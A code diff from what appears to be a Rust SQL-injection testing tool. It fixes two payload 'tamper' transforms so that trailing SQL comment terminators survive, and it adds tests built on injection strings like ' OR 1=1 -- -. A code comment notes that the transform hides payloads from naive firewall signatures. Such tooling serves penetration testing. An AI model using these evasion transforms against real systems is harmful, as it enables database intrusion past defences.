@@ -147,10 +147,19 @@ impl Tamper {
     }
 
     /// Apply this single tamper to `payload` and return the transformed string.
+    ///
+    /// Space-substituting tampers that emit literal (non-decode-symmetric)
+    /// text ([`Tamper::Space2Comment`], [`Tamper::RandomComments`]) preserve a
+    /// trailing SQL line comment (`-- ...` / `#...`): mangling the space in
+    /// `-- -` into `--/**/-` is not a comment in MySQL and would break every
+    /// payload that relies on the terminator.
     #[must_use]
     pub fn apply(&self, payload: &str) -> String {
         match self {
-            Self::Space2Comment => payload.replace(' ', "/**/"),
+            Self::Space2Comment => {
+                let (body, tail) = split_trailing_comment(payload);
+                format!("{}{tail}", body.replace(' ', "/**/"))
+            }
             Self::Space2Plus => payload.replace(' ', "+"),
             Self::Space2Tab => payload.replace(' ', "%09"),
             Self::Space2Newline => payload.replace(' ', "%0a"),
@@ -217,9 +226,10 @@ impl Tamper {
                 out
             }
             Self::RandomComments => {
+                let (body, tail) = split_trailing_comment(payload);
                 let mut rng = rand::rng();
                 let mut out = String::with_capacity(payload.len() * 2);
-                for ch in payload.chars() {
+                for ch in body.chars() {
                     if ch == ' ' {
                         if rng.random_bool(0.5) {
                             out.push_str("/**/**/");
@@ -230,6 +240,7 @@ impl Tamper {
                         out.push(ch);
                     }
                 }
+                out.push_str(tail);
                 out
             }
             Self::EqualToLike => apply_equal_to_like(payload),
@@ -357,6 +368,28 @@ pub fn boolean_safe_transformation_sets(tampers: &[Tamper]) -> Vec<Vec<Tamper>> 
 }
 
 // ── helpers ──────────────────────────────────────────────────────────────
+
+/// Split `(body, trailing line comment)` so space-substituting tampers keep
+/// `-- ...` / `#...` terminators intact (`--/**/-` is not a comment).
+/// Only the LAST `--` (followed by whitespace/end) or `#` counts, so `--`
+/// inside string literals earlier in the payload is left alone.
+fn split_trailing_comment(payload: &str) -> (&str, &str) {
+    if let Some(idx) = payload.rfind('#') {
+        return payload.split_at(idx);
+    }
+    let bytes = payload.as_bytes();
+    let mut i = bytes.len();
+    while i >= 2 {
+        if bytes[i - 2] == b'-' && bytes[i - 1] == b'-' {
+            let rest = &payload[i..];
+            if rest.is_empty() || rest.starts_with(&[' ', '\t', '\n', '\r'][..]) {
+                return payload.split_at(i - 2);
+            }
+        }
+        i -= 1;
+    }
+    (payload, "")
+}
 
 fn char_encode(input: &str) -> String {
     let mut out = String::with_capacity(input.len() * 3);
@@ -612,7 +645,52 @@ mod tests {
     fn space2comment_basic() {
         let p = "' OR 1=1 -- -";
         let out = Tamper::Space2Comment.apply(p);
-        assert_eq!(out, "'/**/OR/**/1=1/**/--/**/-");
+        // trailing `-- -` terminator is preserved: `--/**/-` is not a
+        // comment in MySQL and would break the payload server-side.
+        // (The body's trailing space still becomes `/**/` — valid SQL,
+        // and it also hides the literal ` -- ` from naive WAF signatures.)
+        assert_eq!(out, "'/**/OR/**/1=1/**/-- -");
+    }
+
+    #[test]
+    fn space2comment_preserves_line_comment_terminators() {
+        // MySQL `-- -` style
+        assert_eq!(
+            Tamper::Space2Comment.apply("1 OR 1=1 -- -"),
+            "1/**/OR/**/1=1/**/-- -"
+        );
+        // Postgres/MSSQL/Oracle `--` style
+        assert_eq!(
+            Tamper::Space2Comment.apply("' OR 1=1 --"),
+            "'/**/OR/**/1=1/**/--"
+        );
+        // `#` style
+        assert_eq!(Tamper::Space2Comment.apply("' OR 1=1#"), "'/**/OR/**/1=1#");
+        // no terminator: unchanged behaviour
+        assert_eq!(Tamper::Space2Comment.apply("a b"), "a/**/b");
+    }
+
+    #[test]
+    fn randomcomments_preserves_terminator() {
+        for _ in 0..20 {
+            let out = Tamper::RandomComments.apply("' OR 1=1 -- -");
+            assert!(out.ends_with("-- -"), "terminator mangled: {out}");
+            assert!(!out.contains("--/**/-"), "broken comment: {out}");
+            assert!(out.starts_with('\''), "got {out}");
+            assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
+        }
+    }
+
+    #[test]
+    fn split_trailing_comment_edge_cases() {
+        assert_eq!(split_trailing_comment("a b"), ("a b", ""));
+        assert_eq!(split_trailing_comment("a --"), ("a ", "--"));
+        assert_eq!(split_trailing_comment("a -- -"), ("a ", "-- -"));
+        assert_eq!(split_trailing_comment("a#b"), ("a", "#b"));
+        // `--` inside a string literal without trailing space is not a terminator
+        assert_eq!(split_trailing_comment("a--b"), ("a--b", ""));
+        // last `--` wins (leading space stays in body, tamper converts it)
+        assert_eq!(split_trailing_comment("x--y -- -"), ("x--y ", "-- -"));
     }
 
     #[test]
